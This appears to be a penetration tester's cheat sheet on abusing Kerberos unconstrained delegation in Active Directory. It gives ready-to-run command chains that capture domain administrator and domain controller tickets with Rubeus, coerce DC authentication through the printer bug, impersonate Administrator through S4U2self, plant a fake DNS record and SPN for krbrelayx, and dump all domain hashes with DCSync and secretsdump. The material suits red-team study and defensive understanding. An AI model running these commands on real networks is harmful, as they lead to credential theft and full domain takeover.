- Unconstrained delegation allows a service to impersonate a user when accessing any other service.
- This is a very permissive and dangerous privilege, therefore, not any user can grant it.
- For an account to have an unconstrained delegation, on the Delegation tab of the account, the `Trust this computer for delegation to any service (Kerberos only)` option must be selected.
- Only an administrator or a privileged user having `SeEnableDelegationPrivilege` privilege can perform this action. 
- When this option is enabled, the `TRUSTED_FOR_DELEGATION` flag is set on the account in the User Account Control (UAC) flags.

> Domain controllers are always configured with unconstrained delegation.

## How it Works

- When a client requests a service ticket for an SPN running under the context of this computer account (e.g. the HTTP service), the domain controller sets a flag in the TGS-REP called `ok-as-delegate`.
- This tells the requesting client that the server specified in the ticket is trusted for delegation; so when it sends the AP-REQ to the service, it includes both the service ticket and a copy of the user's TGT.
- The computer running the service will then be able to `cache` the user's TGT in memory, and use it to request service tickets on their behalf in the future.

> If unconstrained delegation is not enabled, only the user's Ticket Granting Service (TGS) ticket will be stored in memory.


# Exploitation from Computer Account

- If we are able to compromise a server that has unconstrained delegation enabled, and a Domain Administrator subsequently logs in, we will be able to extract their TGT and use it to move laterally and compromise other machines, including Domain Controllers.
- As a local administrator, Rubeus can be run to monitor stored tickets. If a TGT is found within a TGS ticket, Rubeus will display it to us.

```powershell
# Find computers with unconstrained delegation
ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samAccountName

# Monitoring for TGT for any user who authenticates
.\Rubeus.exe monitor /interval:5 /nowrap

# Using the Ticket to Request another Ticket
.\Rubeus.exe asktgs /ticket:$TICKET /service:$SERVICE_TO_ACCESS /ptt

# In case the above command doesn't work, we can also use 
# the renew action to get a brand new TGT instead of a TGS ticket
.\Rubeus.exe renew /ticket:$TICKET /ptt
```

- Quickly check details if you get ticket of a user

```powershell
Import-Module .\PowerView.ps1
Get-DomainGroup -MemberIdentity $USERNAME
```


## Exploiting Printer Bug

- We can exploit `Printer Bug` to force a server to authenticate to machine which is configured for unconstrained delegation.

> The target must have spooler service running.
> The remote authentication trigger should be run as a standard domain user in a medium-integrity context.

```powershell
.\SpoolSample.exe $TARGET_HOST $OWNED_HOST
.\SharpSpoolTrigger.exe $TARGET_HOST $OWNED_HOST
```
- We can force DC to authenticate to our owned server and use its TGT to perform DCSync attack.
- After DCSync, we can use hash of any user and get TGT for that user and use it to move laterally.

```powershell
.\Rubeus.exe asktgt /rc4:$HASH /user:$USERNAME /ptt
```

## Impersonating Administrator User using S4U2self

- However, if you inject this ticket into a logon session and attempt to access the computer using a service like CIFS, you'll see that it will fail with an 'access denied' error.
- This is because computer accounts do not get local admin access to themselves remotely.
- The workaround to compromise any computer once you have its TGT is to use the S4U2self protocol to obtain a usable service ticket for a different (impersonated) user. 

```powershell
.\Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:cifs/$HOST /ticket:$TICKET /nowrap
```

> This method is particularly useful for scenarios where we have a ticket from a computer that is not a domain controller.


# Exploitation from User Account

- Users in Active Directory can also be configured for unconstrained delegation, and it's quite different to exploit.
- To enumerate the users with unconstrained delegation, here is the ldap query

```shell
(userAccountControl:1.2.840.113556.1.4.803:=524288)
```

- We can use powerview to find users

```powershell
Import-Module .\PowerView.ps1
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
```

- If we have compromised the account having `TRUSTED_FOR_DELEGATION` we need to update its SPN.
- So we need an account with `GenericAll` or `GenericWrite` over this user.
- We can leverage this unconstrained delegation privilege to become a domain administrator if these conditions are met.

## How it Works

- We create a DNS record that will point to our attack machine.
- This DNS record will be a fake computer in AD.
- We will add SPN `CIFS/our_dns` to our compromised account (the account with TRUSTED_FOR_DELEGATION).
- If a victim tries to connect via SMB to our fake machine, it will ship a copy of its TGT in its TGS ticket since it will ask for a ticket for `CIFS/our_dns`. 
- This TGS ticket will be sent to the IP address we chose when registering the DNS record, i.e., our attack machine.
- All we have to do then is extract the TGT and use it.

```shell
# Create a fake DNS record
git clone -q https://github.com/dirkjanm/krbrelayx; cd krbrelayx
python dnstool.py -u $DOMAIN\\$USER -p $PASSWORD -r $FAKE_COMPUTER_FQDN -d $ATTACK_MACHINE_IP --action add $DC_IP

# Verify DNS record
nslookup $FAKE_COMPUTER_FQDN $DC_FQDN

# Craft SPN on the Target User
python addspn.py -u $DOMAIN\\$USER -p $PASSWORD --target-type samname -t $USERNAME -s CIFS/$FAKE_COMPUTER_FQDN $DC_FQDN

# Using Krbrelayx to get TGS and TGT
sudo python krbrelayx.py -hashes :$HASH_OF_USER_WITH_TRUSTED_FOR_DELEGATION

# Leveraging the Printer Bug with printerbug.py
python dementor.py -u $USER -p $PASSWORD -d $DOMAIN $FAKE_COMPUTER_FQDN $DC_FQDN
python3 printerbug.py $DOMAIN/$USER:$PASSWORD@$DC_IP $FAKE_COMPUTER_FQDN

# Using the ticket
export KRB5CCNAME=$PATH_TO_ccache_FILE
secretsdump.py -k -no-pass $DC_FQDN
```

- In case of error in krbrelayx

```shell
sudo apt remove python3-impacket
sudo apt remove impacket-scripts
git clone -q https://github.com/fortra/impacket;cd impacket
sudo python3 -m pip install .
```